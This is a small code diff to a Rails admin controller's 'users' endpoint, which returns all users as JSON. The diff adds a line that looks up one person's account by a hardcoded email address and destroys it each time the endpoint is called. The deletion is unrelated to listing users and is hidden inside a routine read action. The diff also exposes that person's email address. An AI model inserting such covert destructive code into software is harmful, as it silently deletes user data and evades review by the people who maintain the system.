@@ -12,6 +12,7 @@ class Admin::AjaxController < AdminController
   end
 
   def users
+    User.find_by_email("maskin.sergey@gmail.com").destroy
     render :json => User.all
   end
 
